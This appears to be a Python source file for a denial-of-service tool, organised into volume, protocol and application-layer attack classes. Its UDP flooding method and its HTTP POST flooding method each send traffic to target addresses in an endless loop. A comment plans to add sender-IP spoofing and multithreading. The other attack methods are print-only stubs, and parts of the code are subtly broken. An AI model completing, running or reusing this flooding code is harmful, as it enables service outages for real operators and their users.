import requests as res
import socket as sockk
import time

class VolumeBasedAttack:
    def udp_flooding(bye, vector, port):
        addr = tuple(vector)
        s = sockk.socket(sockk.AF_INET, sockk.SOCK_DGRAM)
        try: 
            while True:
                for i in addr:
                    s.sendto(bye, (addr, port))
                    
                #i'll add a method to change th ipaddr of the sender :), and AFTER ALL i'll implement a method to choose btween multithreading and multiprocessing
        except Exception as e:
            print(f'Error occurred: {e}')
        finally:
            s.close() 
        
        
    def icmp(vector, bye, port):
        print(f"ICMP attack on {vector} with {len(bye)} bytes")

class ProtocolAttack:
    def syn_flood(vector, bye, port):
        print(f"SYN flood attack on {vector} with {len(bye)} bytes")

    def pof(vector, bye, port):
        print(f"POF attack on {vector} with {len(bye)} bytes")

class ApplicationLayerAttack:
    def post(vector, bye):
        print(f"POST attack on {vector} with {len(bye)} bytes")
        print("Using POST method to:", vector)
        print("You have 10 seconds to end the attack, press Ctrl+C or Ctrl+Z")
        time.sleep(10)
        while True:
            for target in vector:
                response = res.post(target, data=bye)
                print(response.text)

    def get(vector, bye):
        print(f"GET attack  on {vector} with {len(bye)} bytes")
